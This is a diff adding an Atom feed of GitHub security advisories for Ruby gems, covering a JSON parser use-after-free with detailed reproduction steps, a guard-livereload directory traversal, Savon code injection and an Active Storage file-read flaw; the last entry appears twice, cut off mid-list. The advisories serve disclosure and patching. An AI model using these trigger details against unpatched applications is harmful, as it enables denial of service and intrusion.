@@ -1,0 +1,1933 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://xlordz.github.io/github-advisory-database-rss/rubygems.rss</id>
+    <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
+    <updated>2026-08-17T17:44:51.220Z</updated>
+    <generator>github-advisory-database-rss</generator>
+    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
+    <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
+    <rights>github-advisory-database-rss</rights>
+    <category term="CRITICAL"/>
+    <category term="HIGH"/>
+    <category term="MODERATE"/>
+    <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[json] Ruby JSON: JSON::ResumableParser#partial_value dereferences a freed input buffer and crashes on truncated duplicate-key streams]]></title>
+        <id>https://github.com/advisories/GHSA-9hj4-r449-hfvc</id>
+        <link href="https://github.com/advisories/GHSA-9hj4-r449-hfvc"/>
+        <updated>2026-08-07T18:33:13.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Ruby's JSON native C extension clears the consumed <code>JSON::ResumableParser</code> input buffer but leaves <code>state.start</code>, <code>state.cursor</code>, and <code>state.end</code> pointing into released storage.</p>
+<p>When <code>partial_value</code> reconstructs an incomplete object containing duplicate keys, the duplicate-key warning path calls <code>cursor_position</code>, which dereferences those stale pointers. This results in a heap-use-after-free and can terminate the Ruby process.</p>
+<p>An attacker who can supply JSON stream data to an application using <code>JSON::ResumableParser</code> may cause process termination when the application calls <code>partial_value</code> on incomplete attacker-controlled input containing duplicate object keys.</p>
+<p>The issue was reproduced in the native C extension from the official RubyGems releases:</p>
+<ul>
+<li>JSON 2.20.0</li>
+<li>JSON 2.21.0</li>
+<li>JSON 2.21.1</li>
+</ul>
+<p>The attached evidence demonstrates:</p>
+<ul>
+<li>an AddressSanitizer-confirmed heap-use-after-free;</li>
+<li>a native <code>SIGSEGV</code> using the official JSON 2.21.1 RubyGem;</li>
+<li>an end-to-end loopback TCP attacker/victim reproduction;</li>
+<li>four differential controls;</li>
+<li>successful execution after applying a tested patch control.</li>
+</ul>
+<p>This was originally reported privately through Ruby's HackerOne program as report <code>#3867755</code>. A Ruby maintainer independently confirmed reproduction of the ASan failure and requested that further coordination continue through this private advisory.</p>
+<p>No code execution or information disclosure is claimed.</p>
+<h3 id="details">Details</h3>
+<p>The affected source is:</p>
+<pre><code class="language-text">ext/json/ext/parser/parser.c
+</code></pre>
+<p>The vulnerable sequence in JSON 2.21.1 is:</p>
+<ol>
+<li><code>cResumableParser_parse</code> reaches the end of the current input buffer.</li>
+<li>It calls <code>json_str_clear(parser-&gt;buffer)</code>.</li>
+<li>It sets <code>parser-&gt;buffer = Qfalse</code>.</li>
+<li>The parser-state pointers into the released buffer are not reset.</li>
+<li><code>partial_value</code> makes a shallow copy of the parser state.</li>
+<li>Reconstructing an incomplete object containing duplicate keys reaches the duplicate-key warning path.</li>
+<li><code>cursor_position</code> walks through the stale input pointers and reads released memory.</li>
+</ol>
+<p>Relevant source locations:</p>
+<ul>
+<li><p>Buffer release:
+<a href="https://github.com/ruby/json/blob/fd61def38b9bb859fee7eec8e7d3143600e5b347/ext/json/ext/parser/parser.c#L2562-L2569">https://github.com/ruby/json/blob/fd61def38b9bb859fee7eec8e7d3143600e5b347/ext/json/ext/parser/parser.c#L2562-L2569</a></p>
+</li>
+<li><p>Parser-state copy:
+<a href="https://github.com/ruby/json/blob/fd61def38b9bb859fee7eec8e7d3143600e5b347/ext/json/ext/parser/parser.c#L2647-L2654">https://github.com/ruby/json/blob/fd61def38b9bb859fee7eec8e7d3143600e5b347/ext/json/ext/parser/parser.c#L2647-L2654</a></p>
+</li>
+<li><p>Stale-pointer read in <code>cursor_position</code>:
+<a href="https://github.com/ruby/json/blob/fd61def38b9bb859fee7eec8e7d3143600e5b347/ext/json/ext/parser/parser.c#L590-L628">https://github.com/ruby/json/blob/fd61def38b9bb859fee7eec8e7d3143600e5b347/ext/json/ext/parser/parser.c#L590-L628</a></p>
+</li>
+<li><p>Duplicate-key handling path:
+<a href="https://github.com/ruby/json/blob/fd61def38b9bb859fee7eec8e7d3143600e5b347/ext/json/ext/parser/parser.c#L1196-L1255">https://github.com/ruby/json/blob/fd61def38b9bb859fee7eec8e7d3143600e5b347/ext/json/ext/parser/parser.c#L1196-L1255</a></p>
+</li>
+</ul>
+<p>When input is supplied to the resumable parser, the parser state stores direct pointers into the backing Ruby string:</p>
+<pre><code class="language-c">RSTRING_GETMEM(parser-&gt;buffer, start, len);
+parser-&gt;state.start = start;
+parser-&gt;state.end = start + len;
+parser-&gt;state.cursor = parser-&gt;state.start + offset;
+</code></pre>
+<p>After the current buffer has been consumed, <code>cResumableParser_parse</code> clears the string and removes the parser's reference to it:</p>
+<pre><code class="language-c">if (eos(&amp;parser-&gt;state)) {
+    json_str_clear(parser-&gt;buffer);
+    parser-&gt;buffer = Qfalse;
+}
+</code></pre>
+<p>This path does not invalidate or replace:</p>
+<pre><code class="language-text">parser-&gt;state.start
+parser-&gt;state.cursor
+parser-&gt;state.end
+</code></pre>
+<p><code>JSON::ResumableParser#partial_value</code> subsequently makes a shallow copy of the parser structure:</p>
+<pre><code class="language-c">JSON_ResumableParser *original_parser = cResumableParser_get(self);
+JSON_ResumableParser parser = *original_parser;
+</code></pre>
+<p>When the partial object contains duplicate keys, reconstruction follows this call path:</p>
+<pre><code class="language-text">cResumableParser_partial_value_body
+  -&gt; json_decode_object
+  -&gt; json_on_duplicate_key
+  -&gt; emit_duplicate_key_warning
+  -&gt; emit_parse_warning
+  -&gt; cursor_position
+</code></pre>
+<p><code>cursor_position</code> then reads through pointers that may refer to released storage.</p>
+<p>AddressSanitizer reports:</p>
+<pre><code class="language-text">ERROR: AddressSanitizer: heap-use-after-free
+cursor_position at parser.c:604
+freed by cResumableParser_parse at parser.c:2567
+</code></pre>
+<p>The reproducer follows the normal resumable-parser API sequence:</p>
+<pre><code class="language-ruby">parser &lt;&lt; chunk
+parser.parse
+parser &lt;&lt; next_chunk
+parser.parse
+parser.partial_value
+</code></pre>
+<p>The issue does not require:</p>
+<ul>
+<li>an application-defined callback;</li>
+<li>explicit garbage collection;</li>
+<li>parser reentrancy;</li>
+<li>custom parser options;</li>
+<li>an attacker-supplied Ruby object;</li>
+<li>manual modification of native parser state.</li>
+</ul>
+<p>The release-build crash reproduced on JSON 2.20.0, 2.21.0, and 2.21.1.</p>
+<p>This report covers the native C-extension implementation. The separate Java-platform implementation was not tested and is not claimed to be affected.</p>
+<h3 id="poc">PoC</h3>
+<p>The complete evidence bundle is attached as:</p>
+<pre><code class="language-text">ruby-json-resumable-partial-value-uaf-evidence-20260716.zip
+</code></pre>
+<p>SHA-256:</p>
+<pre><code class="language-text">07bf8d47b115e45d6145d0447ab6c1c0255e4a7e9b2fb55c3c9a0e24406134ac
+</code></pre>
+<h4 id="requirements">Requirements</h4>
+<ul>
+<li>Linux</li>
+<li>Ruby with development headers</li>
+<li>C compiler</li>
+<li><code>make</code></li>
+<li>RubyGems</li>
+</ul>
+<h4 id="release-build-network-and-differential-reproduction">Release-build, network, and differential reproduction</h4>
+<p>Extract the attachment:</p>
+<pre><code class="language-sh">unzip ruby-json-resumable-partial-value-uaf-evidence-20260716.zip
+cd ruby-json-resumable-partial-value-uaf-evidence-20260716
+</code></pre>
+<p>Run the official JSON 2.21.1 release-build proof, loopback network proof, and differential controls:</p>
+<pre><code class="language-sh">./run_exact_2211.sh
+</code></pre>
+<p>Expected primary results:</p>
+<pre><code class="language-text">release_exit=139
+network_victim_exit=139
+network_result=PASS
+result=PASS
+</code></pre>
+<p>The following four differential controls must also report <code>result=PASS</code>:</p>
+<pre><code class="language-text">unique_key
+duplicate_allowed
+no_partial
+complete_document
+</code></pre>
+<p>The release-build crash stack includes:</p>
+<pre><code class="language-text">cursor_position
+emit_parse_warning
+emit_duplicate_key_warning
+json_decode_object
+cResumableParser_partial_value_body
+</code></pre>
+<h4 id="addresssanitizer-reproduction">AddressSanitizer reproduction</h4>
+<p>Run:</p>
+<pre><code class="language-sh">./run_asan.sh
+</code></pre>
+<p>Expected vulnerable result:</p>
+<pre><code class="language-text">asan_vulnerable_exit=134
+ERROR: AddressSanitizer: heap-use-after-free
+cursor_position at parser.c:604
+freed by cResumableParser_parse at parser.c:2567
+</code></pre>
+<p>Expected patched-control result:</p>
+<pre><code class="language-text">asan_patched_exit=0
+asan_result=PASS
+</code></pre>
+<h4 id="affected-version-matrix">Affected-version matrix</h4>
+<p>The release-build crash was reproduced three times for each of the following official RubyGems releases:</p>
+<pre><code class="language-text">json 2.20.0
+json 2.21.0
+json 2.21.1
+</code></pre>
+<p>Additional evidence is included in:</p>
+<pre><code class="language-text">artifacts/exact-2211-e2e.txt
+artifacts/asan-and-patched-control.txt
+artifacts/version-matrix.txt
+artifacts/source-and-release-verification.txt
+source-slices.txt
+prior-art.md
+patch-control.diff
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is a use-after-free that can result in native Ruby process termination.</p>
+<p>An attacker must be able to supply JSON stream data to an application that:</p>
+<ol>
+<li>uses <code>JSON::ResumableParser</code>;</li>
+<li>processes attacker-controlled streaming input;</li>
+<li>calls <code>partial_value</code> after parsing an incomplete document containing duplicate object keys.</li>
+</ol>
+<p>In network-facing deployments meeting these conditions, an attacker can cause process termination and denial of service.</p>
+<p>The release-build crash was reproduced consistently in the tested Linux environment. The AddressSanitizer result confirms the underlying heap-use-after-free independently of normal allocator behavior.</p>
+<p>The demonstrated impact is:</p>
+<pre><code class="language-text">Denial of service through native process termination
+</code></pre>
+<p>No confidentiality impact, integrity impact, arbitrary code execution, or information disclosure is claimed.</p>
+<h3 id="suggested-remediation">Suggested remediation</h3>
+<p>Before clearing or releasing the resumable parser's input buffer, invalidate or replace every parser-state pointer that refers to the buffer's backing storage.</p>
+<p>Delayed code paths such as duplicate-key warning generation must not calculate cursor positions using pointers after the corresponding buffer has been released.</p>
+<p>The attached <code>patch-control.diff</code> demonstrates one tested control and is provided for validation rather than as a required final implementation.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ruby/json/security/advisories/GHSA-9hj4-r449-hfvc">https://github.com/ruby/json/security/advisories/GHSA-9hj4-r449-hfvc</a></li>
+<li><a href="https://github.com/advisories/GHSA-9hj4-r449-hfvc">https://github.com/advisories/GHSA-9hj4-r449-hfvc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9hj4-r449-hfvc</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-08-07T18:33:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[guard-livereload] guard-livereload has a directory traversal vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-g65v-27r3-5p6m</id>
+        <link href="https://github.com/advisories/GHSA-g65v-27r3-5p6m"/>
+        <updated>2026-07-31T22:33:02.000Z</updated>
+        <content type="html"><![CDATA[<p>The vulnerability allows remote attackers to read arbitrary files
+on the server by exploiting improper path validation in the
+livereload server functionality.</p>
+<p>This vulnerability is related to the handling of file paths in the
+livereload server component, which could allow an attacker to traverse
+directories and access files outside the intended web root directory.</p>
+<p>The issue was identified and reported through the DWF (Distributed
+Weakness Filing) project, which assigns CVE identifiers for
+security vulnerabilities.</p>
+<p>A directory traversal vulnerability exists in
+guard-livereload before version 2.5.2.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/guard/guard-livereload/issues/159">https://github.com/guard/guard-livereload/issues/159</a></li>
+<li><a href="https://github.com/guard/guard-livereload/pull/158">https://github.com/guard/guard-livereload/pull/158</a></li>
+<li><a href="https://github.com/guard/guard-livereload/commit/0e98469e6b9d81a5bd415781534a23d087c271f8">https://github.com/guard/guard-livereload/commit/0e98469e6b9d81a5bd415781534a23d087c271f8</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/guard-livereload/CVE-2016-1000305.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/guard-livereload/CVE-2016-1000305.yml</a></li>
+<li><a href="https://security.snyk.io/vuln/SNYK-RUBY-GUARDLIVERELOAD-20361">https://security.snyk.io/vuln/SNYK-RUBY-GUARDLIVERELOAD-20361</a></li>
+<li><a href="https://github.com/advisories/GHSA-g65v-27r3-5p6m">https://github.com/advisories/GHSA-g65v-27r3-5p6m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g65v-27r3-5p6m</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-31T22:33:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[savon] Savon::Model evaluates WSDL operation names as Ruby source]]></title>
+        <id>https://github.com/advisories/GHSA-mx5j-mp4f-g8jg</id>
+        <link href="https://github.com/advisories/GHSA-mx5j-mp4f-g8jg"/>
+        <updated>2026-07-31T19:38:26.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p><code>Savon::Model</code> generated SOAP operation methods by interpolating operation names into Ruby source passed to <code>module_eval</code>. An attacker who can control the operation names of a WSDL, can inject Ruby code that executes in the application process. This affects only the <code>.all_operations</code> class method provided by <code>Savon::Model</code> to automatically register all operations provided by the WSDL. Configuring <code>Savon::Model</code> with trusted operation names via <code>.operations</code> is safe.</p>
+<h3 id="patches">Patches</h3>
+<p>Patched in Savon 2.17.2.</p>
+<p>Users should upgrade to 2.17.2 or later.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Avoid <code>.all_operations</code> for untrusted WSDL documents. Use <code>.operations</code> with trusted operation names instead.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/savonrb/savon/security/advisories/GHSA-mx5j-mp4f-g8jg">https://github.com/savonrb/savon/security/advisories/GHSA-mx5j-mp4f-g8jg</a></li>
+<li><a href="https://github.com/savonrb/savon/commit/8f22eb543e7436f6247172c9be47e22792d375e9">https://github.com/savonrb/savon/commit/8f22eb543e7436f6247172c9be47e22792d375e9</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/savon/CVE-2026-53510.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/savon/CVE-2026-53510.yml</a></li>
+<li><a href="https://github.com/savonrb/savon/releases/tag/v2.17.2">https://github.com/savonrb/savon/releases/tag/v2.17.2</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-53510">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-53510</a></li>
+<li><a href="https://github.com/advisories/GHSA-mx5j-mp4f-g8jg">https://github.com/advisories/GHSA-mx5j-mp4f-g8jg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mx5j-mp4f-g8jg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-31T19:38:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[activestorage] Active Storage has possible arbitrary file read and remote code execution in Active Storage variant processing]]></title>
+        <id>https://github.com/advisories/GHSA-xr9x-r78c-5hrm</id>
+        <link href="https://github.com/advisories/GHSA-xr9x-r78c-5hrm"/>
+        <updated>2026-07-30T18:23:34.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>In its default configuration, a Rails application that displays image variants may allow an
+unauthenticated attacker to read arbitrary files from the server, including the process environment.
+That environment typically holds <code>secret_key_base</code> and often credentials for external systems, which
+may in turn allow escalation to remote code execution or lateral movement to those systems.</p>
+<h3 id="details">Details</h3>
+<p>libvips reads and writes file formats through "loaders" and "savers" (or more generally
+"operations"), many of which are backed by third-party libraries. It marks some of these operations
+as "unfuzzed", meaning they are unsafe for untrusted content, and several handle formats unrelated
+to web images. Active Storage did not disable the unfuzzed operations, so an attacker who can upload
+a crafted file and cause a variant to be generated from it may be able to invoke one.</p>
+<p>We are aware of a mechanism by which an attacker, by uploading a crafted file, is able to cause
+disclosure of the contents of arbitrary files accessible on the filesystem of the targeted
+application. One specific attack chain has been reported to us (see "Disclosure" below), but we do
+not assume it is the only one that exists.</p>
+<h3 id="affected-applications">Affected applications</h3>
+<p>An application is affected if it meets all of these requirements:</p>
+<ul>
+<li>Uses libvips for Active Storage image processing. This is <code>config.active_storage.variant_processor = :vips</code>,
+which <code>load_defaults 7.0</code> set and no later default has changed.</li>
+<li>Allows image uploads from untrusted users.</li>
+</ul>
+<p>Generating variants is not a separate requirement.</p>
+<h3 id="mitigation">Mitigation</h3>
+<ul>
+<li>Upgrade to a fixed version of <code>activestorage</code>.</li>
+<li>The minimum version of libvips must be upgraded to <code>&gt;= 8.13</code>.</li>
+<li>Change <code>secret_key_base</code> and change any secrets accessible in the application environment (see "Expire and change secrets" below)</li>
+</ul>
+<p>Earlier versions of libvips (<code>&lt; 8.13</code>) cannot disable unfuzzed operations at all, and Active Storage
+will raise an exception during boot in such an unsecurable environment.</p>
+<h3 id="expire-and-change-secrets">Expire and change secrets</h3>
+<p>Upgrading closes the vulnerability but does not undo an exfiltrated secret if that already
+occurred. An affected application should treat every secret readable by the application process as
+potentially exposed and change it, including:</p>
+<ul>
+<li><code>secret_key_base</code></li>
+<li>The master key, whether stored in <code>config/master.key</code> or supplied as <code>RAILS_MASTER_KEY</code>, along
+with everything in <code>config/credentials.yml.enc</code> that it decrypts</li>
+<li>Credentials for the Active Storage service, such as S3, GCS, or Azure keys</li>
+<li>Database credentials</li>
+<li>Tokens and keys for any third-party service the application calls</li>
+</ul>
+<p>Changing <code>secret_key_base</code> expires active sessions and requires users to log in again. Encrypted
+cookies, signed cookies, signed global IDs, and Active Storage URLs are also affected.</p>
+<p>Rotation should only be used as an intermediate step if necessary. Do not retain an exposed secret
+as a fallback.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If libvips <code>&lt; 8.13</code> is being used, there are no workarounds available other than removing the
+dependency on libvips from the application. Some applications may have <code>ruby-vips</code> declared as a
+dependency only for image analysis, and those applications may be able to simply remove <code>ruby-vips</code>
+from the Gemfile to remove libvips from the application. Applications that do not use Active Storage
+can remove <code>ruby-vips</code> from the Gemfile to avoid the boot-time checks.</p>
+<p>If libvips <code>&gt;= 8.13</code> is present on the system, applications can disable the unfuzzed operations
+without upgrading Rails by setting the <code>VIPS_BLOCK_UNTRUSTED</code> environment variable, which libvips
+reads while initializing.</p>
+<p>Applications also running ruby-vips <code>&gt;= 2.2.1</code> or later can instead call
+<code>Vips.block_untrusted(true)</code> from an initializer.</p>
+<h3 id="releases">Releases</h3>
+<p>The fixed releases are available at the normal locations.</p>
+<h3 id="versions-affected">Versions affected</h3>
+<ul>
+<li>activestorage &lt; 7.2.3.2</li>
+<li>activestorage &gt;= 8.0, &lt; 8.0.5.1</li>
+<li>activestorage &gt;= 8.1, &lt; 8.1.3.1</li>
+</ul>
+<h3 id="disclosure">Disclosure</h3>
+<p>Technical details of the attack chain are intentionally omitted from this advisory. They would add
+nothing to an administrator's decision to upgrade, while making it substantially easier to attack
+applications that have not yet done so.</p>
+<p>Details will be disclosed no later than 2026-08-28, via the <a href="https://discuss.rubyonrails.org/c/security-announcements/9">Rails Security
+Announcements</a> forum.</p>
+<h3 id="credit">Credit</h3>
+<p>This issue was responsibly reported by <a href="https://x.com/0xacb">0xacb</a>, <a href="https://x.com/s3np41k1r1t0">s3np41k1r1t0</a> and <a href="https://x.com/castilho101">castilho</a> from <a href="https://ethiack.com">Ethiack</a>, and <a href="https://ryotak.net">RyotaK</a> from <a href="https://flatt.tech/en/">GMO Flatt Security Inc.</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>libvips 8.13 release notes, <a href="https://www.libvips.org/2022/05/28/What's-new-in-8.13.html#blocking-of-unfuzzed-loaders">blocking of unfuzzed loaders</a></li>
+<li>W.A. Arbaugh, W.L. Fithen, and J. McHugh, <a href="https://doi.org/10.1109/2.889093">"Windows of Vulnerability: A Case Study
+Analysis"</a>, IEEE Computer 33(12), December 2000</li>
+<li><a href="https://ethiack.com/info-hub/research/kindarails2shell-rails-rce-cve">https://ethiack.com/info-hub/research/kindarails2shell-rails-rce-cve</a></li>
+<li><a href="https://blog.flatt.tech/entry/kindarails2shell_rails">https://blog.flatt.tech/entry/kindarails2shell_rails</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/rails/rails/security/advisories/GHSA-xr9x-r78c-5hrm">https://github.com/rails/rails/security/advisories/GHSA-xr9x-r78c-5hrm</a></li>
+<li><a href="https://github.com/rails/rails/commit/1c01bb587206ee6eb0e1179c2cef96a6a47acb1e">https://github.com/rails/rails/commit/1c01bb587206ee6eb0e1179c2cef96a6a47acb1e</a></li>
+<li><a href="https://github.com/rails/rails/commit/349e7a5d5b4b715af1e416db824f3c078a7d59e5">https://github.com/rails/rails/commit/349e7a5d5b4b715af1e416db824f3c078a7d59e5</a></li>
+<li><a href="https://github.com/rails/rails/commit/d79b7f4aa17dec8ce4960fef05733c8c0c7ef49a">https://github.com/rails/rails/commit/d79b7f4aa17dec8ce4960fef05733c8c0c7ef49a</a></li>
+<li><a href="https://github.com/rails/rails/releases/tag/v7.2.3.2">https://github.com/rails/rails/releases/tag/v7.2.3.2</a></li>
+<li><a href="https://github.com/rails/rails/releases/tag/v8.0.5.1">https://github.com/rails/rails/releases/tag/v8.0.5.1</a></li>
+<li><a href="https://github.com/rails/rails/releases/tag/v8.1.3.1">https://github.com/rails/rails/releases/tag/v8.1.3.1</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activestorage/CVE-2026-66066.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activestorage/CVE-2026-66066.yml</a></li>
+<li><a href="https://thehackernews.com/2026/07/critical-rails-flaw-could-let.html">https://thehackernews.com/2026/07/critical-rails-flaw-could-let.html</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-66066">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-66066</a></li>
+<li><a href="https://github.com/advisories/GHSA-xr9x-r78c-5hrm">https://github.com/advisories/GHSA-xr9x-r78c-5hrm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xr9x-r78c-5hrm</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-30T18:23:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[activestorage] Active Storage has possible arbitrary file read and remote code execution in Active Storage variant processing]]></title>
+        <id>https://github.com/advisories/GHSA-xr9x-r78c-5hrm</id>
+        <link href="https://github.com/advisories/GHSA-xr9x-r78c-5hrm"/>
+        <updated>2026-07-30T18:23:34.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>In its default configuration, a Rails application that displays image variants may allow an
+unauthenticated attacker to read arbitrary files from the server, including the process environment.
+That environment typically holds <code>secret_key_base</code> and often credentials for external systems, which
+may in turn allow escalation to remote code execution or lateral movement to those systems.</p>
+<h3 id="details">Details</h3>
+<p>libvips reads and writes file formats through "loaders" and "savers" (or more generally
+"operations"), many of which are backed by third-party libraries. It marks some of these operations
+as "unfuzzed", meaning they are unsafe for untrusted content, and several handle formats unrelated
+to web images. Active Storage did not disable the unfuzzed operations, so an attacker who can upload
+a crafted file and cause a variant to be generated from it may be able to invoke one.</p>
+<p>We are aware of a mechanism by which an attacker, by uploading a crafted file, is able to cause
+disclosure of the contents of arbitrary files accessible on the filesystem of the targeted
+application. One specific attack chain has been reported to us (see "Disclosure" below), but we do
+not assume it is the only one that exists.</p>
+<h3 id="affected-applications">Affected applications</h3>
+<p>An application is affected if it meets all of these requirements:</p>
+<ul>
+<li>Uses libvips for Active Storage image processing. This is <code>config.active_storage.variant_processor = :vips</code>,
+which <code>load_defaults 7.0</code> set and no later default has changed.</li>
+<li>Allows image uploads from untrusted users.</li>
+</ul>
+<p>Generating variants is not a separate requirement.</p>
+<h3 id="mitigation">Mitigation</h3>
+<ul>
+<li>Upgrade to a fixed version of <code>activestorage</code>.</li>
+<li>The minimum version of libvips must be upgraded to <code>&gt;= 8.13</code>.</li>
+<li>Change <code>secret_key_base</code> and change any secrets accessible in the application environment (see "Expire and change secrets" below)</li>
+</ul>
+<p>Earlier versions of libvips (<code>&lt; 8.13</code>) cannot disable unfuzzed operations at all, and Active Storage
+will raise an exception during boot in such an unsecurable environment.</p>
+<h3 id="expire-and-change-secrets">Expire and change secrets</h3>
+<p>Upgrading closes the vulnerability but does not undo an exfiltrated secret if that already
+occurred. An affected application should treat every secret readable by the application process as
+potentially exposed and change it, including:</p>
+<ul>
+<li><code>secret_key_base</code></li>
+<li>The master key, whether stored in <code>config/master.key</code> or supplied as <code>RAILS_MASTER_KEY</code>, along
+with everything in <code>config/credentials.yml.enc</code> that it decrypts</li>
+<li>Credentials for the Active Storage service, such as S3, GCS, or Azure keys</li>
+<li>Database credentials</li>
+<li>Tokens and keys for any third-party service the application calls</li>
+</ul>
+<p>Changing <code>secret_key_base</code> expires active sessions and requires users to log in again. Encrypted
+cookies, signed cookies, signed global IDs, and Active Storage URLs are also affected.</p>
+<p>Rotation should only be used as an intermediate step if necessary. Do not retain an exposed secret
+as a fallback.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If libvips <code>&lt; 8.13</code> is being used, there are no workarounds available other than removing the
+dependency on libvips from the application. Some applications may have <code>ruby-vips</code> declared as a
+dependency only for image analysis, and those applications may be able to simply remove <code>ruby-vips</code>
+from the Gemfile to remove libvips from the application. Applications that do not use Active Storage
+can remove <code>ruby-vips</code> from the Gemfile to avoid the boot-time checks.</p>
+<p>If libvips <code>&gt;= 8.13</code> is present on the system, applications can disable the unfuzzed operations
+without upgrading Rails by setting the <code>VIPS_BLOCK_UNTRUSTED</code> environment variable, which libvips
+reads while initializing.</p>
+<p>Applications also running ruby-vips <code>&gt;= 2.2.1</code> or later can instead call
+<code>Vips.block_untrusted(true)</code> from an initializer.</p>
+<h3 id="releases">Releases</h3>
+<p>The fixed releases are available at the normal locations.</p>
+<h3 id="versions-affected">Versions affected</h3>
+<ul>
+<li>activestorage &lt; 7.2.3.2</li>
+<li>activestorage &gt;= 8.0, &lt; 8.0.5.1</li>
+<li>activestorage &gt;= 8.1, &lt; 8.1.3.1</li>
+</ul>
+<h3 id="disclosure">Disclosure</h3>
+<p>Technical details of the attack chain are intentionally omitted from this advisory. They would add
+nothing to an administrator's decision to upgrade, while making it substantially easier to attack
+applications that have not yet done so.</p>
+<p>Details will be disclosed no later than 2026-08-28, via the <a href="https://discuss.rubyonrails.org/c/security-announcements/9">Rails Security
+Announcements</a> forum.</p>
+<h3 id="credit">Credit</h3>
+<p>This issue was responsibly reported by <a href="https://x.com/0xacb">0xacb</a>, <a href="https://x.com/s3np41k1r1t0">s3np41k1r1t0</a> and <a href="https://x.com/castilho101">castilho</a> from <a href="https://ethiack.com">Ethiack</a>, and <a href="https://ryotak.net">RyotaK</a> from <a href="https://flatt.tech/en/">GMO Flatt Security Inc.</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>libvips 8.13 release notes, <a href="https://www.libvips.org/2022/05/28/What's-new-in-8.13.html#blocking-of-unfuzzed-loaders">blocking of unfuzzed loaders</a></li>
+<li>W.A. Arbaugh, W.L. Fithen, and J. McHugh, <a href="https://doi.org/10.1109/2.889093">"Windows of Vulnerability: A Case Study
+Analysis"</a>, IEEE Computer 33(12), December 2000</li>
+<li><a href="https://ethiack.com/info-hub/research/kindarails2shell-rails-rce-cve">https://ethiack.com/info-hub/research/kindarails2shell-rails-rce-cve</a></li>
+<li><a href="https://blog.flatt.tech/entry/kindarails2shell_rails">https://blog.flatt.tech/entry/kindarails2shell_rails</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/rails/rails/security/advisories/GHSA-xr9x-r78c-5hrm">https://github.com/rails/rails/security/advisories/GHSA-xr9x-r78c-5hrm</a></li>
+<li><a href="https://github.com/rails/rails/commit/1c01bb587206ee6eb0e1179c2cef96a6a47acb1e">https://github.com/rails/rails/commit/1c01bb587206ee6eb0e1179c2cef96a6a47acb1e</a></li>
+<li><a href="https://github.com/rails/rails/commit/349e7a5d5b4b715af1e416db824f3c078a7d59e5">https://github.com/rails/rails/commit/349e7a5d5b4b715af1e416db824f3c078a7d59e5</a></li>
+<li><a href="https://github.com/rails/rails/commit/d79b7f4aa17dec8ce4960fef05733c8c0c7ef49a">https://github.com/rails/rails/commit/d79b7f4aa17dec8ce4960fef05733c8c0c7ef49a</a></li>
+<li><a href="https://github.com/rails/rails/releases/tag/v7.2.3.2">https://github.com/rails/rails/releases/tag/v7.2.3.2</a></li>
+<li><a href="https://github.com/rails/rails/releases/tag/v8.0.5.1">https://github.com/rails/rails/releases/tag/v8.0.5.1</a></li>
+<li><a href="https://github.com/rails/rails/releases/tag/v8.1.3.1">https://github.com/rails/rails/releases/tag/v8.1.3.1</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activestorage/CVE-2026-66066.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activestorage/CVE-2026-66066.yml</a></li>
+<li><a href="https://thehackernews.com/2026/07/critical-rails-flaw-could-let.html">https://thehackernews.com/2026/07/critical-rails-flaw-could-let.html</a></li>
